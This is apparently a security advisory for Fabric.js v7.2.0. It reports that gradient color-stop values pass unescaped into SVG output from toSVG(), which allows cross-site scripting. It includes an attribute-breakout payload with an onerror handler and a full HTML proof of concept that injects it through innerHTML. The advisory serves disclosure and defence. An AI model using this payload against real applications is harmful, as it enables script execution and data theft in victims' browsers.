summary: "Fabric.js improper escaping in fabric.Gradient colorStops leads to XSS in SVG serialization\n\
  ### Summary\n\nA potential Cross-Site Scripting (XSS) vulnerability exists in Fabric.js due\
  \ to improper escaping of user-controlled input during SVG serialization via the `toSVG()`\
  \ method.\n\nSpecifically, the `color` field within the `colorStops` array of a `fabric.Gradient`\
  \ object is not properly escaped when converted into SVG `<stop>` elements. If an application\
  \ renders the generated SVG string into the DOM (e.g., via `innerHTML`), this may allow an\
  \ attacker to inject arbitrary HTML/SVG and execute JavaScript in the victim's browser.\n\n\
  ### Details\n\nDuring SVG export, Fabric.js serializes gradient color stops into `<stop>`\
  \ elements like:\n\n```xml\n<stop offset=\"0\" stop-color=\"...\"></stop>\n```\n\nHowever,\
  \ the `color` value is inserted into the `stop-color` attribute without proper escaping of\
  \ special characters such as `\"`, `<`, and `>`. This allows crafted input to break out of\
  \ the attribute context and inject arbitrary markup.\n\nFor example:\n```js\ncolor: 'red\"\
  ><img src=\"x\" onerror=\"alert(1)\">'\n```\n\nmay result in:\n```xml\n<stop offset=\"0\"\
  \ stop-color=\"red\">\n<img src=\"x\" onerror=\"alert(1)\">\n```\nThis breaks the intended\
  \ SVG structure and introduces executable HTML.\n\n### PoC (Proof of Concept)\n\nSuccessfully\
  \ verified on **v7.2.0** (current latest version). The following HTML and JavaScript code\
  \ reproduces the vulnerability. The code constructs a rectangle with a maliciously crafted\
  \ gradient color stop and exports it to SVG:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\
  \   <title>Fabric.js SVG Export XSS Bypass Test</title>\n   <script src=\"[https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js](https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js)\"\
  ></script>\n</head>\n<body>\n   <h1>Fabric.js SVG Export XSS Bypass Test (Gradient Color)</h1>\n\
  \   <canvas id=\"c\" width=\"400\" height=\"300\"></canvas>\n   \n   <h3>SVG Output Rendering:</h3>\n\
  \   <div id=\"svg-output\" style=\"border: 1px solid #ccc; padding: 10px; margin-top: 10px;\"\
  ></div>\n\n   <script>\n       setTimeout(() => {\n           const canvas = new fabric.Canvas('c');\n\
  \           \n           // Construct a malicious gradient object\n           const maliciousGradient\
  \ = new fabric.Gradient({\n               type: 'linear',\n               coords: { x1: 0,\
  \ y1: 0, x2: 100, y2: 0 },\n               colorStops: [\n                   {\n         \
  \              offset: 0,\n                       // Inject XSS payload to prematurely close\
  \ the attribute/tag\n                       color: 'red\"><img src=\"x\" onerror=\"alert(\\\
  'XSS Triggered Successfully!\\')\">'\n                   },\n                   { offset:\
  \ 1, color: 'blue' }\n               ]\n           });\n\n           const rect = new fabric.Rect({\n\
  \               left: 50, top: 50, width: 300, height: 100,\n               fill: maliciousGradient\n\
  \           });\n\n           canvas.add(rect);\n\n           // Export to SVG string containing\
  \ the malicious code\n           const svgOutput = canvas.toSVG();\n\n           // Render\
  \ on the page to trigger the XSS\n           document.getElementById('svg-output').innerHTML\
  \ = svgOutput;\n       }, 100);\n   </script>\n</body>\n</html>\n```\n\n### Impact\n\nThis\
  \ issue can lead to XSS in applications that:\n1. Allow user-controlled input in gradient\
  \ definitions (e.g., color values)\n2. Use `canvas.toSVG()` to export content\n3. Insert the\
  \ resulting SVG string into the DOM without sanitization (e.g., via `innerHTML`)\n\nSuccessful\
  \ exploitation may result in the execution of arbitrary JavaScript in the victim's browser,\
  \ theft of sensitive data, or unauthorized actions on behalf of the user.\n\n### Suggested\
  \ Fix\n**Proper Escaping (Recommended)**: Escape special characters in attribute values during\
  \ SVG serialization."
